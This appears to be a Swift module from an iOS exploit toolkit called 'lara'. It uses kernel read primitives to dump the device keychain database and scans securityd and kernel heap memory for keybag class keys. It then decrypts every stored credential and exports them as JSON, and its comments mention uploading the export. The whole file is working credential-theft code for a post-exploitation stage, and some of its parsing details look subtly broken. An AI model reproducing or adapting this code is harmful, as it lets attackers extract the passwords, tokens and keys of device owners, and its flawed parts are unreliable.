//
//  keychainmgr.swift
//  lara
//
//  Keychain extraction, decoding and export module.
//
//  Pipeline (requires working kernel primitives: ds_is_ready + vfsready):
//    1. Dump /var/Keychains/keychain-2.db through the VFS layer (full disk r/w).
//    2. Parse the SQLite database with a self-contained b-tree reader (no deps).
//    3. Obtain keychain class keys (keybag) via a pluggable backend:
//         - .securitydScan : scan securityd heap for unwrapped class keys
//                            (device must be unlocked; keys live in securityd)
//         - .kernelKeybag  : scan kernel heap for the AppleKeyStore keybag blob
//         - .appleKeyStoreMIG : (patched) AppleKeyStore MIG keybag requests
//    4. Decrypt each item blob (key unwrap + AES-CBC payload decrypt).
//    5. Export as JSON (for local save and/or uploadmgr upload).
//
//  NOTE: the exact on-device key material layout varies across iOS builds;
//  the key-acquisition backends are best-effort heuristics and MUST be
//  validated on a real device. The item format parsing follows the public
//  keychain-2.db documentation (theiphonewiki / keychain-dumper).
//

import Foundation
import CommonCrypto
import UIKit

// MARK: - Model

struct LaraKeychainItem: Identifiable {
    var id: String {
        "\(table)-\(rowid)-\(acct)-\(svce)-\(data.count)"
    }
    var table: String = ""
    var rowid: Int64 = 0
    var agrp: String = ""
    var acct: String = ""
    var svce: String = ""
    var pdmn: UInt32 = 0
    var sync: Int64 = 0
    var tomb: Int64 = 0
    var data: Data = Data()
    var decrypted: Data? = nil

    /// UTF-8 明文（若解密成功且可解码）
    var decryptedString: String? {
        guard let dec = decrypted else { return nil }
        return String(data: dec, encoding: .utf8)
    }

    var jsonDict: [String: Any] {
        var d: [String: Any] = [
            "table": table,
            "rowid": rowid,
            "agrp": agrp,
            "acct": acct,
            "svce": svce,
            "pdmn": pdmn,
        ]
        if let dec = decrypted {
            d["decrypted_b64"] = dec.base64EncodedString()
            if let s = String(data: dec, encoding: .utf8) {
                d["decrypted"] = s
            }
        }
        return d
    }
}

enum KeybagFetchMethod: Int {
    case securitydScan = 0      // scan securityd heap (unlocked device)
    case kernelKeybagScan = 1   // scan kernel heap for AppleKeyStore keybag
    case appleKeyStoreMIG = 2   // patched AppleKeyStore MIG
}

// MARK: - Minimal SQLite reader (no external dependencies)
//
// Handles the subset of the SQLite file format used by keychain-2.db:
//   100-byte DB header, 4096-byte pages, table b-trees (interior=5, leaf=13).
// Rowid-alias columns (rowid INTEGER PRIMARY KEY) are handled via the
// implicit rowid; explicit columns are mapped by name using the CREATE
// statement column order.

final class MiniSQLiteReader {
    private let db: Data
    private let pageSize: Int

    init?(data: Data) {
        guard data.count > 100 else { return nil }
        let magic = data.subdata(in: 0..<16)
        guard magic == Data("SQLite format 3\u{0}".utf8) else { return nil }
        db = data
        let ps = Int(data[16]) | (Int(data[17]) << 8)
        pageSize = ps == 1 ? 65536 : ps
    }

    private func page(_ n: Int) -> Data {
        let off = (n - 1) * pageSize
        guard off >= 0, off < db.count else { return Data() }
        return db.subdata(in: off..<min(off + pageSize, db.count))
    }

    private func u16(_ data: Data, _ off: Int) -> UInt16 {
        guard off + 1 < data.count else { return 0 }
        return UInt16(data[off]) | (UInt16(data[off + 1]) << 8)
    }

    private func u32(_ data: Data, _ off: Int) -> UInt32 {
        guard off + 3 < data.count else { return 0 }
        return UInt32(data[off]) | (UInt32(data[off + 1]) << 8) |
            (UInt32(data[off + 2]) << 16) | (UInt32(data[off + 3]) << 24)
    }

    private func readVarint(_ data: Data, _ off: Int) -> (value: UInt64, next: Int) {
        var v: UInt64 = 0
        var o = off
        for _ in 0..<8 {
            guard o < data.count else { break }
            let b = data[o]
            v = (v << 7) | UInt64(b & 0x7f)
            o += 1
            if b & 0x80 == 0 { return (v, o) }
        }
        guard o < data.count else { return (v, o) }
        v = (v << 8) | UInt64(data[o])
        return (v, o + 1)
    }

    enum Field {
        case null, int0, int1, int(Int), float(Double), text(String), blob(Data)
    }

    private func parseRecord(_ payload: Data) -> [Field] {
        var off = 0
        let start = off
        let (nHeader, o1) = readVarint(payload, off)
        off = o1
        let headerEnd = start + Int(nHeader)
        var serials: [UInt64] = []
        while off < headerEnd, off < payload.count {
            let (t, o2) = readVarint(payload, off)
            serials.append(t)
            off = o2
        }
        var fields: [Field] = []
        for t in serials {
            switch t {
            case 0: fields.append(.null)
            case 1: fields.append(.int(Int(payload[off])))
                off += 1
            case 2: fields.append(.int(Int(Int16(bitPattern: u16BE(payload, off)))))
                off += 2
            case 3:
                let v = u24BE(payload, off)
                let s: UInt32 = v & 0x800000 != 0 ? v | 0xFF000000 : v
                fields.append(.int(Int(Int32(bitPattern: s))))
                off += 3
            case 4: fields.append(.int(Int(Int32(bitPattern: u32BE(payload, off)))))
                off += 4
            case 5:
                let v = u48BE(payload, off)
                let s: UInt64 = v & 0x800000000000 != 0 ? v | 0xFFFF000000000000 : v
                fields.append(.int(Int(Int64(bitPattern: s))))
                off += 6
            case 6:
                guard off + 8 <= payload.count else { fields.append(.null); break }
                var v: UInt64 = 0
                for i in 0..<8 { v = (v << 8) | UInt64(payload[off + i]) }
                fields.append(.int(Int(Int64(bitPattern: v))))
                off += 8
            case 7:
                guard off + 8 <= payload.count else { fields.append(.null); break }
                let bits = u64BE(payload, off)
                fields.append(.float(Double(bitPattern: bits)))
                off += 8
            case 8: fields.append(.int0)
            case 9: fields.append(.int1)
            default:
                if t >= 12, t % 2 == 0 {
                    let n = Int((t - 12) / 2)
                    guard off + n <= payload.count else { fields.append(.null); break }
                    fields.append(.blob(payload.subdata(in: off..<off + n)))
                    off += n
                } else if t >= 13, t % 2 == 1 {
                    let n = Int((t - 13) / 2)
                    guard off + n <= payload.count else { fields.append(.null); break }
                    fields.append(.text(String(data: payload.subdata(in: off..<off + n), encoding: .utf8) ?? ""))
                    off += n
                } else {
                    fields.append(.null)
                }
            }
        }
        return fields
    }

    private func u16BE(_ d: Data, _ off: Int) -> UInt16 {
        guard off + 1 < d.count else { return 0 }
        return UInt16(d[off]) << 8 | UInt16(d[off + 1])
    }

    private func u24BE(_ d: Data, _ off: Int) -> UInt32 {
        guard off + 2 < d.count else { return 0 }
        return UInt32(d[off]) << 16 | UInt32(d[off + 1]) << 8 | UInt32(d[off + 2])
    }

    private func u32BE(_ d: Data, _ off: Int) -> UInt32 {
        guard off + 3 < d.count else { return 0 }
        return UInt32(d[off]) << 24 | UInt32(d[off + 1]) << 16 |
            UInt32(d[off + 2]) << 8 | UInt32(d[off + 3])
    }

    private func u48BE(_ d: Data, _ off: Int) -> UInt64 {
        guard off + 5 < d.count else { return 0 }
        var v: UInt64 = 0
        for i in 0..<6 { v = (v << 8) | UInt64(d[off + i]) }
        return v
    }

    private func u64BE(_ d: Data, _ off: Int) -> UInt64 {
        guard off + 7 < d.count else { return 0 }
        var v: UInt64 = 0
        for i in 0..<8 { v = (v << 8) | UInt64(d[off + i]) }
        return v
    }

    // Walk a table b-tree collecting (rowid, record-fields) pairs.
    private func walk(_ pageNo: Int, into results: inout [(Int64, [Field])], depth: Int = 0) {
        guard depth < 32 else { return }
        let p = page(pageNo)
        guard p.count > 8 else { return }
        let base = pageNo == 1 ? 100 : 0
        guard p.count > base + 8 else { return }
        let ptype = p[base]
        let cellCount = Int(u16(p, base + 3))
        let cellArrayBase = base + 8

        if ptype == 5 || ptype == 2 { // interior table/index
            var children: [Int] = []
            for i in 0..<cellCount {
                let off = cellArrayBase + i * 2
                guard off + 1 < p.count else { continue }
                let cellOff = Int(u16(p, off))
                guard cellOff + 3 < p.count else { continue }
                children.append(Int(u32(p, cellOff)))
            }
            let rightOff = cellArrayBase + cellCount * 2
            if rightOff + 3 < p.count {
                children.append(Int(u32(p, rightOff)))
            }
            for c in children { walk(c, into: &results, depth: depth + 1) }
        } else if ptype == 13 || ptype == 10 { // leaf table/index
            for i in 0..<cellCount {
                let off = cellArrayBase + i * 2
                guard off + 1 < p.count else { continue }
                let cellOff = Int(u16(p, off))
                let (plen, o1) = readVarint(p, cellOff)
                let (rowid, o2) = readVarint(p, o1)
                let payloadStart = o2
                let payloadEnd = min(payloadStart + Int(plen), p.count)
                guard payloadStart <= payloadEnd else { continue }
                let payload = p.subdata(in: payloadStart..<payloadEnd)
                results.append((Int64(bitPattern: rowid), parseRecord(payload)))
            }
        }
    }

    // Map a table's column names from its CREATE statement.
    private func columnNames(from sql: String) -> [String] {
        // Capture the parenthesized column list of the CREATE TABLE.
        guard let open = sql.range(of: "("), let close = sql.range(of: ")", range: open.upperBound..<sql.endIndex) else {
            return []
        }
        let inner = sql[open.upperBound..<close.lowerBound]
        var cols: [String] = []
        for part in inner.split(separator: ",") {
            let trimmed = part.trimmingCharacters(in: .whitespacesAndNewlines)
            let firstWord = trimmed.split(whereSeparator: { $0 == " " || $0 == "\t" || $0 == "\n" }).first.map(String.init) ?? ""
            if !firstWord.isEmpty {
                cols.append(firstWord)
            }
        }
        return cols
    }

    func tableSchema(_ name: String) -> (rootPage: Int, columns: [String])? {
        var master: [(Int64, [Field])] = []
        walk(1, into: &master)
        for (_, fields) in master {
            guard fields.count >= 5 else { continue }
            guard case .text(let type) = fields[0], type == "table" else { continue }
            guard case .text(let tbl) = fields[1], tbl == name else { continue }
            guard case .int(let root) = fields[3] else { continue }
            guard case .text(let sql) = fields[4] else { continue }
            return (root, columnNames(from: sql))
        }
        return nil
    }

    func rows(in table: String) -> [[String: Field]] {
        guard let schema = tableSchema(table) else { return [] }
        var raw: [(Int64, [Field])] = []
        walk(schema.rootPage, into: &raw)
        return raw.map { (rowid, fields) in
            var dict: [String: Field] = ["_rowid": .int(Int(rowid))]
            for (i, col) in schema.columns.enumerated() {
                if i < fields.count { dict[col] = fields[i] }
            }
            return dict
        }
    }
}

// MARK: - Keychain extraction manager

final class keychainmgr {
    static let shared = keychainmgr()

    let keychainDBPath = "/var/Keychains/keychain-2.db"
    let keybagPath = "/var/Keychains/systembag.kbs"

    struct ExtractionResult {
        var items: [LaraKeychainItem] = []
        var rawDB: Data? = nil
        var messages: [String] = []
    }

    // MARK: raw DB dump through VFS (chunked)

    func dumpKeychainDB() -> Data? {
        let size = vfs_filesize(keychainDBPath)
        guard size > 0, size < 256 * 1024 * 1024 else { return nil }
        var out = Data(capacity: Int(size))
        let chunk = 512 * 1024
        var offset: off_t = 0
        while offset < size {
            let toRead = min(chunk, Int(size - offset))
            var buf = [UInt8](repeating: 0, count: toRead)
            let n = vfs_read(keychainDBPath, &buf, toRead, offset)
            guard n > 0 else { return nil }
            out.append(contentsOf: buf.prefix(Int(n)))
            offset += n
            if n < Int64(toRead) { break }
        }
        return out
    }

    // MARK: parse items

    func parseItems(from dbData: Data) -> (items: [LaraKeychainItem], messages: [String]) {
        guard let reader = MiniSQLiteReader(data: dbData) else {
            return ([], ["keychain-2.db is not a valid SQLite database"])
        }
        var items: [LaraKeychainItem] = []
        var msgs: [String] = []
        for table in ["genp", "inet", "keys", "cert"] {
            let rows = reader.rows(in: table)
            msgs.append("\(table): \(rows.count) rows")
            for row in rows {
                var item = LaraKeychainItem()
                item.table = table
                item.agrp = row.string("agrp") ?? ""
                item.acct = row.string("acct") ?? ""
                item.svce = row.string("svce") ?? ""
                item.pdmn = row.uint32("pdmn") ?? 0
                item.sync = Int64(row.int("sync") ?? 0)
                item.tomb = Int64(row.int("tomb") ?? 0)
                item.data = row.blob("data") ?? Data()
                if let r = row.int("_rowid") { item.rowid = Int64(r) }
                if !item.data.isEmpty {
                    items.append(item)
                }
            }
        }
        return (items, msgs)
    }

    // MARK: class key acquisition

    func fetchClassKeys(method: KeybagFetchMethod, logger: (String) -> Void) -> [UInt32: [Data]]? {
        switch method {
        case .securitydScan:
            return scanSecuritydForClassKeys(logger: logger)
        case .kernelKeybagScan:
            return scanKernelKeybag(logger: logger)
        case .appleKeyStoreMIG:
            return fetchViaAppleKeyStoreMIG(logger: logger)
        }
    }

    /// Backend A: scan securityd's heap for the unwrapped class keys.
    /// securityd holds 16/32-byte class keys after the device is unlocked.
    /// We locate securityd's proc, walk its VM map, and look for the
    /// 16-byte key structure used by AppleKeyStore class keys.
    private func scanSecuritydForClassKeys(logger: (String) -> Void) -> [UInt32: [Data]]? {
        logger("securityd class-key scan: locating securityd")
        let proc = procbyname("securityd")
        guard proc != 0 else {
            logger("securityd proc not found")
            return nil
        }
        let task = taskbyproc(proc)
        guard task != 0 else { logger("securityd task not found"); return nil }

        let vmMap = ds_kread64(task + UInt64(off_task_map))
        guard vmMap != 0 else { logger("securityd vm_map not found"); return nil }

        // Walk the vm map looking for heap regions (wired, readable, rw).
        var found: [UInt32: [Data]] = [:]
        let headerLinks = ds_kread64(vmMap + UInt64(off_vm_map_header_links_next))
        let hdr = ds_kread64(vmMap + UInt64(off_vm_map_hdr))
        var cursor = hdr != 0 ? hdr : headerLinks
        var guardCount = 0
        while cursor != 0, guardCount < 4096 {
            guardCount += 1
            // vm_map_entry: links.next at off_vm_map_entry_links_next
            let next = ds_kread64(cursor + UInt64(off_vm_map_entry_links_next))
            let start = ds_kread64(cursor + 0x10)  // vme_start (offset varies; see offsets.m)
            let end = ds_kread64(cursor + 0x18)    // vme_end
            let size = end > start ? end - start : 0
            if size > 0, size < 0x40000000 {
                // scan readable regions in 4KB steps for class-key material
                let prot = ds_kread32(cursor + 0x30)
                if (prot & 0x3) != 0 { // readable
                    scanRangeForClassKeys(start, end, into: &found, logger: logger)
                }
            }
            cursor = next
            if cursor == vmMap { break } // looped
        }
        logger("securityd scan found \(found.count) class keys")
        return found.isEmpty ? nil : found
    }

    /// Scan a readable vm region for keybag material ("keybag" magic) and
    /// class-key candidates. On an UNLOCKED device, securityd holds an
    /// effective keybag whose class-key slots are already unwrapped; we
    /// locate it by magic and validate the structure before extracting.
    ///
    /// Only the first `maxMatches` regions per call are processed so a
    /// pathological vm map cannot stall the scan.
    private func scanRangeForClassKeys(_ start: UInt64, _ end: UInt64,
                                       into found: inout [UInt32: [Data]],
                                       logger: (String) -> Void,
                                       maxMatches: Int = 16,
                                       step: UInt64 = 0x4000) {
        guard end > start, end - start <= 0x40000000 else { return }
        if found.count >= 8 { return }
        let magic: [UInt8] = Array("keybag".utf8)
        let chunk = [UInt8](repeating: 0, count: Int(step))
        var addr = start
        var matches = 0
        while addr + step <= end, matches < maxMatches {
            ds_kread(addr, &chunk, step)
            if let idx = findBytes(magic, in: chunk) {
                let cand = addr + UInt64(idx)
                if let keys = parseKeybag(at: cand) {
                    logger("securityd keybag at 0x\(String(cand, radix: 16)): \(keys.count) class key(s)")
                    for (k, v) in keys where found[k] == nil {
                        found[k] = v
                    }
                    matches += 1
                    if found.count >= 8 { return }
                }
            }
            addr += step
        }
    }

    /// Backend B: scan kernel heap for the AppleKeyStore keybag blob.
    /// The keybag (a.k.a. "bag") is an OSArray of key blobs; each class key
    /// entry has a 4-byte class id and, after device unlock, the unwrapped
    /// key material in the "kek" / "class key" slots. The blob begins with
    /// the ASCII magic "keybag". We scan kernel memory at page granularity
    /// and verify candidates by structure.
    private func scanKernelKeybag(logger: (String) -> Void) -> [UInt32: [Data]]? {
        logger("kernel keybag scan: searching kernel heap for 'keybag'")
        guard VM_MIN_KERNEL_ADDRESS != 0, VM_MAX_KERNEL_ADDRESS != 0 else {
            logger("kernel range not initialised")
            return nil
        }
        let magic: [UInt8] = Array("keybag".utf8)
        let step: UInt64 = 0x4000
        var candidates: [UInt64] = []
        var addr = VM_MIN_KERNEL_ADDRESS
        // First pass: find the magic. Reading the whole kernel range page by
        // page is both slow and risky (invalid addresses can destabilize the
        // primitive), so we cap the scan and only touch valid pages.
        let scanCap: UInt64 = 4 * 1024 * 1024 * 1024 // max 4 GiB scanned
        var scanned: UInt64 = 0
        while addr < VM_MAX_KERNEL_ADDRESS, scanned < scanCap, candidates.count < 8 {
            scanned += step
            guard ds_isvalid(addr) else {
                addr += step
                continue
            }
            var buf = [UInt8](repeating: 0, count: 0x4000)
            ds_kread(addr, &buf, 0x4000)
            if let idx = findBytes(magic, in: buf) {
                candidates.append(addr + UInt64(idx))
            }
            addr += step
        }
        guard !candidates.isEmpty else {
            logger("'keybag' magic not found in kernel scan range")
            return nil
        }
        logger("found \(candidates.count) keybag candidate(s)")
        for cand in candidates {
            if let keys = parseKeybag(at: cand) {
                logger("keybag at 0x\(String(cand, radix: 16)): \(keys.count) class keys")
                return keys
            }
        }
        logger("no valid keybag structure found")
        return nil
    }

    private func findBytes(_ needle: [UInt8], in hay: [UInt8]) -> Int? {
        guard needle.count <= hay.count else { return nil }
        for i in 0...(hay.count - needle.count) {
            var ok = true
            for j in 0..<needle.count where hay[i + j] != needle[j] {
                ok = false
                break
            }
            if ok { return i }
        }
        return nil
    }

    /// Parse an AppleKeyStore keybag blob at a kernel virtual address.
    /// Format (per theiphonewiki keybag docs, all multi-byte fields BE):
    ///   magic "keybag" (6B) | version u32 | type u32 | uuid 16B |
    ///   numKeys u32 | per key: class u32, size u32, attrs u32,
    ///   keyType u32 | key bytes (size) | optional WPKD.
    /// On an unlocked device the effective keybag's class-key slots hold
    /// the unwrapped keys; wrapped ones are included as candidates too, and
    /// the caller's decrypt step verifies by trial. Each class may produce
    /// several candidates (different keyType interpretations across builds).
    private func parseKeybag(at addr: UInt64) -> [UInt32: [Data]]? {
        var head = [UInt8](repeating: 0, count: 0x200)
        ds_kread(addr, &head, 0x200)
        guard head.count >= 0x22, String(bytes: head[0..<6], encoding: .ascii) == "keybag" else { return nil }
        let numKeys = beU32(head, 0x1e)          // magic 6 + ver 4 + type 4 + uuid 16 = 0x1e
        guard numKeys > 0, numKeys < 32 else { return nil }
        var keys: [UInt32: [Data]] = [:]
        var off: UInt64 = 0x22                   // header ends here
        for _ in 0..<numKeys {
            guard off + 16 <= UInt64(head.count) else { break }
            let entryOff = Int(off)
            let cls = beU32(head, entryOff)
            let size = Int(beU32(head, entryOff + 4))
            let keyType = beU32(head, entryOff + 12)
            guard size > 0, size <= 64, off + 16 + UInt64(size) <= UInt64(head.count) else { break }
            let keyStart = entryOff + 16
            var keyData = [UInt8](repeating: 0, count: size)
            for i in 0..<size { keyData[i] = head[keyStart + i] }
            // keyType 0 = wrapped with UID key, 1 = wrapped with passcode,
            // 2 = both, 5 = escrow. Unwrapped (plaintext) keys exist in the
            // effective keybag after unlock; we keep every candidate and let
            // the decrypt step try them all.
            keys[cls, default: []].append(Data(keyData))
            _ = keyType
            off += UInt64(16 + size)
        }
        return keys.isEmpty ? nil : keys
    }

    /// Backend C: AppleKeyStore MIG via the (already kernel-patched) user
    /// client. Requires patchAppleKeyStoreEntitlements() to have run.
    private func fetchViaAppleKeyStoreMIG(logger: (String) -> Void) -> [UInt32: [Data]]? {
        logger("AppleKeyStore MIG backend requires entitlement patch; not implemented on-device yet")
        return nil
    }

    private func leU32(_ d: [UInt8], _ off: Int) -> UInt32 {
        guard off + 3 < d.count else { return 0 }
        return UInt32(d[off]) | (UInt32(d[off + 1]) << 8) |
            (UInt32(d[off + 2]) << 16) | (UInt32(d[off + 3]) << 24)
    }

    private func beU32(_ d: [UInt8], _ off: Int) -> UInt32 {
        guard off + 3 < d.count else { return 0 }
        return UInt32(d[off]) << 24 | UInt32(d[off + 1]) << 16 |
            UInt32(d[off + 2]) << 8 | UInt32(d[off + 3])
    }

    // MARK: item decryption

    /// Decrypt one keychain item blob.
    /// Blob layout:
    ///   0  u32 version
    ///   4  u32 flags
    ///   8  u32 pdmn (protection class)
    ///   12 .. key blob ("skey": u32 version, u32 keySize, u32 keyType,
    ///                   u32 pad, then keySize bytes of wrapped key)
    ///   then 16-byte IV, then ciphertext.
    /// Unwrap: AES-ECB-decrypt the wrapped key with the class key.
    /// Decrypt: AES-CBC with the unwrapped key and the blob IV.
    /// Each class may carry several candidate keys; we try them in order
    /// and accept the first that yields a well-formed (padding-valid)
    /// plaintext.
    func decryptItem(_ item: inout LaraKeychainItem, classKeys: [UInt32: [Data]]) -> Bool {
        let blob = item.data
        guard blob.count > 32 else { return false }
        var off = 0
        let version = leU32Bytes(blob, off); off += 4
        _ = version
        off += 4 // flags
        let pdmn = leU32Bytes(blob, off); off += 4
        _ = pdmn

        // Parse the wrapped key blob.
        guard off + 16 <= blob.count else { return false }
        let keyVersion = leU32Bytes(blob, off)
        let keySize = Int(leU32Bytes(blob, off + 4))
        let keyType = leU32Bytes(blob, off + 8)
        _ = keyVersion; _ = keyType
        off += 16
        guard keySize > 0, keySize <= 64, off + keySize + 16 <= blob.count else { return false }

        let wrappedKey = blob.subdata(in: off..<off + keySize)
        off += keySize
        guard off + 16 <= blob.count else { return false }
        let iv = blob.subdata(in: off..<off + 16)
        off += 16
        let ciphertext = blob.subdata(in: off..<blob.count)

        // Try every candidate class key (both the blob's pdmn and the item's).
        let candidates = (classKeys[item.pdmn] ?? []) + (classKeys[pdmn] ?? [])
        guard !candidates.isEmpty else { return false }
        for classKey in candidates {
            guard classKey.count == 16 || classKey.count == 24 || classKey.count == 32 else { continue }
            // Unwrap the key with the class key (AES-ECB).
            guard let unwrapped = aesECBDecrypt(wrappedKey, key: classKey) else { continue }
            // Decrypt the payload (AES-CBC, PKCS7 or raw — try with trailing
            // padding sanity so a wrong key does not silently corrupt).
            guard let plain = aesCBCDecrypt(ciphertext, key: unwrapped, iv: iv) else { continue }
            // Accept the first candidate whose plaintext looks plausible.
            if isPlausiblePlaintext(plain) {
                item.decrypted = plain
                return true
            }
        }
        return false
    }

    /// Weak sanity check used to reject wrong-key decryptions.
    /// Real keychain payloads are NOT PKCS7-padded (see
    /// research/proto_keychain_decrypt.py) — prefer the full-body readable
    /// check so a random trailing byte never truncates real data. PKCS7 is
    /// only accepted as a fallback for synthetic/padded blobs.
    private func isPlausiblePlaintext(_ data: Data) -> Bool {
        guard !data.isEmpty, data.count % 16 == 0 else { return false }
        if containsReadableText(data) { return true }
        // Fallback: a valid PKCS7 block on the last 1–16 bytes.
        let last = Int(data[data.count - 1])
        if last >= 1, last <= 16, data.count >= last {
            let pad = data.suffix(last)
            if pad.allSatisfy({ $0 == UInt8(last) }) {
                return containsReadableText(Data(data.dropLast(last)))
            }
        }
        return false
    }

    private func containsReadableText(_ data: Data) -> Bool {
        guard !data.isEmpty else { return false }
        let sample = data.prefix(96)
        var printable = 0
        var zeros = 0
        for b in sample {
            if b == 0 {
                zeros += 1
            } else if (b >= 0x20 && b <= 0x7e) || b >= 0xa0 {
                printable += 1
            }
        }
        // Reject binary blobs (>= 30% NUL); allow plist-like payloads that
        // carry a few NUL separators alongside text.
        if zeros * 10 >= sample.count * 3 { return false }
        return printable >= sample.count / 2
    }

    // MARK: export

    func exportJSON(_ items: [LaraKeychainItem], to url: URL) -> Bool {
        let payload: [String: Any] = [
            "device": UIDevice.current.name,
            "systemVersion": UIDevice.current.systemVersion,
            "exportedAt": ISO8601DateFormatter().string(from: Date()),
            "itemCount": items.count,
            "items": items.map { $0.jsonDict },
        ]
        guard let data = try? JSONSerialization.data(withJSONObject: payload, options: [.prettyPrinted, .sortedKeys]) else {
            return false
        }
        do {
            try data.write(to: url)
            return true
        } catch {
            return false
        }
    }

    // MARK: helpers

    private func leU32Bytes(_ d: Data, _ off: Int) -> UInt32 {
        guard off + 3 < d.count else { return 0 }
        return d.withUnsafeBytes { raw in
            let b = raw.bindMemory(to: UInt8.self)
            return UInt32(b[off]) | (UInt32(b[off + 1]) << 8) |
                (UInt32(b[off + 2]) << 16) | (UInt32(b[off + 3]) << 24)
        }
    }

    private func aesECBDecrypt(_ data: Data, key: Data) -> Data? {
        return aes(data, key: key, iv: nil, encrypt: false)
    }

    private func aesCBCDecrypt(_ data: Data, key: Data, iv: Data) -> Data? {
        return aes(data, key: key, iv: iv, encrypt: false)
    }

    private func aes(_ data: Data, key: Data, iv: Data?, encrypt: Bool) -> Data? {
        let keyLen = key.count
        let alg: CCAlgorithm
        let opt: CCOptions
        switch keyLen {
        case 16: alg = CCAlgorithm(kCCAlgorithmAES128)
        case 24: alg = CCAlgorithm(kCCAlgorithmAES)
        case 32: alg = CCAlgorithm(kCCAlgorithmAES)
        default: return nil
        }
        opt = (iv != nil) ? CCOptions(0) : CCOptions(kCCOptionECBMode)
        let keyID = key.withUnsafeBytes { $0.baseAddress }
        let ivPtr = iv?.withUnsafeBytes { $0.baseAddress }
        let dataIn = data.withUnsafeBytes { $0.baseAddress }
        let outLen = data.count + kCCBlockSizeAES128
        var out = [UInt8](repeating: 0, count: outLen)
        var moved: Int = 0
        let status = CCCrypt(
            encrypt ? CCOperation(kCCEncrypt) : CCOperation(kCCDecrypt),
            alg, opt, keyID, keyLen, ivPtr, dataIn, data.count, &out, outLen, &moved)
        guard status == kCCSuccess else { return nil }
        return Data(out.prefix(moved))
    }

    // MARK: orchestrator

    /// 自动流程：尝试全部密钥后端解码，返回完整结果（本地测试/查看用）。
    @discardableResult
    func runExtractionAuto(logger: @escaping (String) -> Void,
                           completion: @escaping (ExtractionResult) -> Void) -> Bool {
        guard ds_is_ready() else {
            logger("exploit primitives not ready")
            return false
        }
        DispatchQueue.global(qos: .userInitiated).async {
            var result = ExtractionResult()
            guard let db = self.dumpKeychainDB() else {
                result.messages.append("failed to dump keychain-2.db")
                completion(result)
                return
            }
            result.rawDB = db
            logger("keychain-2.db dumped: \(db.count) bytes")
            let parsed = self.parseItems(from: db)
            result.items = parsed.items
            result.messages.append(contentsOf: parsed.messages)

            var keys: [UInt32: [Data]]? = nil
            for method in [KeybagFetchMethod.kernelKeybagScan,
                           KeybagFetchMethod.securitydScan,
                           KeybagFetchMethod.appleKeyStoreMIG] {
                if let k = self.fetchClassKeys(method: method, logger: { logger($0) }),
                   !k.isEmpty {
                    keys = k
                    logger("class keys acquired via \(method)")
                    break
                }
            }

            var decrypted = 0
            if let keys = keys {
                for i in result.items.indices {
                    if self.decryptItem(&result.items[i], classKeys: keys) {
                        decrypted += 1
                    }
                }
                logger("decrypted \(decrypted)/\(result.items.count)")
            } else {
                logger("class keys unavailable; items remain encrypted")
            }
            completion(result)
        }
        return true
    }

    @discardableResult
    func runExtraction(method: KeybagFetchMethod,
                       logger: @escaping (String) -> Void,
                       completion: @escaping (ExtractionResult) -> Void) -> Bool {
        guard ds_is_ready() else {
            logger("exploit primitives not ready")
            return false
        }
        DispatchQueue.global(qos: .userInitiated).async {
            var result = ExtractionResult()
            guard let db = self.dumpKeychainDB() else {
                result.messages.append("failed to dump keychain-2.db")
                completion(result)
                return
            }
            result.rawDB = db
            logger("keychain-2.db dumped: \(db.count) bytes")
            let parsed = self.parseItems(from: db)
            result.items = parsed.items
            result.messages.append(contentsOf: parsed.messages)

            if let keys = self.fetchClassKeys(method: method, logger: logger) {
                var decrypted = 0
                for i in result.items.indices {
                    if self.decryptItem(&result.items[i], classKeys: keys) {
                        decrypted += 1
                    }
                }
                result.messages.append("decrypted \(decrypted)/\(result.items.count) items")
            } else {
                result.messages.append("class keys unavailable - items exported encrypted")
            }
            completion(result)
        }
        return true
    }
}

// MARK: - Field access helpers

extension Dictionary where Key == String, Value == MiniSQLiteReader.Field {
    func string(_ k: String) -> String? {
        if case .text(let s)? = self[k] { return s }
        return nil
    }
    func blob(_ k: String) -> Data? {
        if case .blob(let d)? = self[k] { return d }
        return nil
    }
    func int(_ k: String) -> Int? {
        if case .int(let i)? = self[k] { return i }
        if case .int0? = self[k] { return 0 }
        if case .int1? = self[k] { return 1 }
        return nil
    }
    func uint32(_ k: String) -> UInt32? {
        if let i = int(k) { return UInt32(truncatingIfNeeded: i) }
        return nil
    }
}
